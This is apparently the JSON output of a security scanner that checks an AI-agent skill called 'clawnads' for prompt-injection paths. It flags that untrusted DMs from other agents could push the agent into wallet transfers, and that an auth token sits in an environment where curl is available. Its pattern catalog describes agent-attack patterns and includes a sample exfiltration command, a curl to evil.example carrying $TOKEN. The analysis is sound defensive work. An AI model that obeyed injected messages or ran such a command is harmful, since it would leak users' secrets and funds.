@@ -1,0 +1,199 @@
+{
+  "skill": "clawnads",
+  "candidates": [
+    {
+      "skill": "clawnads",
+      "kind": "path",
+      "path": [
+        "n4",
+        "n3",
+        "n2",
+        "n5"
+      ],
+      "path_labels": [
+        "external_text: Other agents (DMs) [untrusted]",
+        "receive: Other agents (DMs)",
+        "Agent context",
+        "api: POST /agents/NAME/wallet/send"
+      ],
+      "edges": [
+        {
+          "from": "n4",
+          "to": "n3",
+          "certainty": "extracted",
+          "via": "doc_instruction"
+        },
+        {
+          "from": "n3",
+          "to": "n2",
+          "certainty": "extracted",
+          "via": "doc_instruction"
+        },
+        {
+          "from": "n2",
+          "to": "n5",
+          "certainty": "probabilistic",
+          "via": "doc_instruction"
+        }
+      ],
+      "shape": {
+        "source_category": "external_text",
+        "source_trust": "untrusted",
+        "sink_category": "value_transfer",
+        "cross_modal": false,
+        "probabilistic_edges": 1,
+        "code_involved": false,
+        "via_agent_context": true,
+        "uses_defaults": false
+      },
+      "severity": 0,
+      "evidence": [
+        {
+          "node": "n4",
+          "file": "SKILL.md",
+          "lines": [
+            1,
+            1
+          ],
+          "quote": "name: clawnads description: Register with Clawnads to get a Privy wallet on Monad, trade tokens, and collaborate with other agents. . . . metadata: { \"openclaw\": { \"emoji\": \" \", \"requires\": { \"env\": [\"CLAW_AUTH_TOKEN\"], \"bins\": [\"curl\"] } } }  # Clawnads ... You are part of a multi-agent network. Other agents DM you with proposals, questions, and funding requests. Read, evaluate, and respond to every message. ...  ## Wallet & Transactions ... POST /agents/NAME/wallet/send ... Withdrawal protection: Sends to external (non-agent) wallets require operator approval.  Agent-to-agent transfers execute instantly. ..."
+        },
+        {
+          "node": "n3",
+          "file": "SKILL.md",
+          "lines": [
+            1,
+            1
+          ],
+          "quote": "name: clawnads description: Register with Clawnads to get a Privy wallet on Monad, trade tokens, and collaborate with other agents. . . . metadata: { \"openclaw\": { \"emoji\": \" \", \"requires\": { \"env\": [\"CLAW_AUTH_TOKEN\"], \"bins\": [\"curl\"] } } }  # Clawnads ... You are part of a multi-agent network. Other agents DM you with proposals, questions, and funding requests. Read, evaluate, and respond to every message. ...  ## Wallet & Transactions ... POST /agents/NAME/wallet/send ... Withdrawal protection: Sends to external (non-agent) wallets require operator approval.  Agent-to-agent transfers execute instantly. ..."
+        },
+        {
+          "node": "n5",
+          "file": "SKILL.md",
+          "lines": [
+            1,
+            1
+          ],
+          "quote": "name: clawnads description: Register with Clawnads to get a Privy wallet on Monad, trade tokens, and collaborate with other agents. . . . metadata: { \"openclaw\": { \"emoji\": \" \", \"requires\": { \"env\": [\"CLAW_AUTH_TOKEN\"], \"bins\": [\"curl\"] } } }  # Clawnads ... You are part of a multi-agent network. Other agents DM you with proposals, questions, and funding requests. Read, evaluate, and respond to every message. ...  ## Wallet & Transactions ... POST /agents/NAME/wallet/send ... Withdrawal protection: Sends to external (non-agent) wallets require operator approval.  Agent-to-agent transfers execute instantly. ..."
+        }
+      ],
+      "status": "candidate",
+      "id": "p1",
+      "pattern": {
+        "id": "T2",
+        "name": "Data-to-instruction promotion",
+        "summary": "Untrusted content enters the agent context and a doc instruction tells the agent to act on it."
+      }
+    }
+  ],
+  "confluence": [],
+  "ambient_secrets": [
+    {
+      "skill": "clawnads",
+      "id": "a1",
+      "kind": "ambient_secret",
+      "context": "n2",
+      "secret_sources": [
+        "n6"
+      ],
+      "secret_labels": [
+        "env CLAW_AUTH_TOKEN [secret]"
+      ],
+      "untrusted_sources": [
+        "n4"
+      ],
+      "capabilities": [
+        {
+          "node": null,
+          "label": "declared binary: curl",
+          "sink_category": "declared_bin"
+        }
+      ],
+      "path": [
+        "n4",
+        "n2",
+        "n6"
+      ],
+      "pattern": {
+        "id": "T8",
+        "name": "Ambient secret exfiltration",
+        "summary": "Untrusted content is in the context, the agent can use a shell or the network, and a secret sits in its environment."
+      },
+      "evidence": [
+        {
+          "node": "n6",
+          "file": "SKILL.md",
+          "lines": [
+            1,
+            1
+          ],
+          "quote": "CLAW_AUTH_TOKEN"
+        },
+        {
+          "node": "n4",
+          "file": "SKILL.md",
+          "lines": [
+            1,
+            1
+          ],
+          "quote": "name: clawnads description: Register with Clawnads to get a Privy wallet on Monad, trade tokens, and collaborate with other agents. . . . metadata: { \"openclaw\": { \"emoji\": \" \", \"requires\": { \"env\": [\"CLAW_AUTH_TOKEN\"], \"bins\": [\"curl\"] } } }  # Clawnads ... You are part of a multi-agent network. Other agents DM you with proposals, questions, and funding requests. Read, evaluate, and respond to every message. ...  ## Wallet & Transactions ... POST /agents/NAME/wallet/send ... Withdrawal protection: Sends to external (non-agent) wallets require operator approval.  Agent-to-agent transfers execute instantly. ..."
+        }
+      ],
+      "status": "candidate"
+    }
+  ],
+  "pattern_catalog": {
+    "T1": {
+      "name": "Direct taint flow",
+      "summary": "Untrusted data reaches a sink with no decision by the agent on the way.",
+      "explanation": "The data flows straight into a dangerous operation: typically the doc tells the agent to pass untrusted data (e.g. a repository file name) as a script argument, and the script hands it to the shell unsanitized. Every step is code or an explicit instruction, so it fires whenever the skill runs on attacker-controlled input.",
+      "rule": "Su -> ... -> K without passing through the Agent context"
+    },
+    "T2": {
+      "name": "Data-to-instruction promotion",
+      "summary": "Untrusted content enters the agent context and a doc instruction tells the agent to act on it.",
+      "explanation": "The skill turns data into commands: for example it fetches a page and says \"follow any setup steps it contains\". Whoever controls the content controls what the agent does. No code bug is needed; the vulnerable part is the instruction.",
+      "rule": "Su ~> C ->p K, where K is a doc operator (e.g. follow content, a state-changing API call such as a value transfer)"
+    },
+    "T3": {
+      "name": "LLM-mediated chaining",
+      "summary": "One script's output enters the context and the agent copies a value from it into another script.",
+      "explanation": "The LLM is the bridge between two scripts: it picks a value (a branch name, a title) from output it has read and passes it on. If that value is attacker-chosen and the second script uses it unsafely, the attack crosses the LLM. Static taint tools miss this because the link is not in any code.",
+      "rule": "Su ~> C ->p script input ~> K (via llm_binding)"
+    },
+    "T4": {
+      "name": "Untrusted persistent write",
+      "summary": "External content is written into a file the agent auto-loads (CLAUDE.md, AGENTS.md, .cursorrules).",
+      "explanation": "Whoever controls the written content controls the agent's standing instructions, not just this run but every future session in that project (persists edge back into the context).",
+      "rule": "Su ~> K (agent_config_write), plus K -> C (persists)"
+    },
+    "T5": {
+      "name": "Trigger over-breadth",
+      "summary": "Untrusted content in the context can make the agent activate a skill through its broad description.",
+      "explanation": "The skill's description matches too much (\"use whenever X is mentioned\"), so any page, file or issue that mentions X can start the skill without the user asking. Dangerous when the triggered skill has powerful sinks of its own.",
+      "rule": "Su ~> C ->p K (skill_trigger), description breadth >= threshold"
+    },
+    "T6": {
+      "name": "Exposure",
+      "summary": "Untrusted or secret data is placed into the agent context (or a secret into a file).",
+      "explanation": "A script prints data into the context (or writes a secret to a file). Nothing acts on it yet: with untrusted data it is the first half of T2/T3; with a secret it is a leak by itself (the token is now in the conversation, logs, or a shareable report). Lowest severity.",
+      "rule": "(Su | Ss) ~> K (context_output) -> C, or Ss ~> K (file_write)"
+    },
+    "T7": {
+      "name": "Secret-untrusted confluence",
+      "summary": "A secret and attacker-controlled content end up in the same context, which has a way out.",
+      "explanation": "Neither flow is a vulnerability alone. Together, the attacker's text can ask the agent to send the secret it can already see. Defined by two flows meeting at the context, plus an outflow (often the documented default network outflow).",
+      "rule": "Ss ~> C  and  Su ~> C  and  C ->p K (network/shell)"
+    },
+    "T8": {
+      "name": "Ambient secret exfiltration",
+      "summary": "Untrusted content is in the context, the agent can use a shell or the network, and a secret sits in its environment.",
+      "explanation": "The secret never has to be printed: attacker text can ask the agent to run a command such as `curl https://evil.example/?t=$TOKEN`, and the shell substitutes the value on the way out. Weaker than T7 (the agent must emit an attacker-written command) and reported only when no T7 covers the same context.",
+      "rule": "Su ~> C  and  C ->p K (shell/network, or a declared network/shell binary)  and  Ss in env (not ~> C)"
+    }
+  },
+  "binding_errors": [],
+  "rejected_records": [],
+  "warnings": [
+    "SKILL.md has no YAML frontmatter fences; recovered fields from an inline header: description, metadata, name"
+  ]
+}
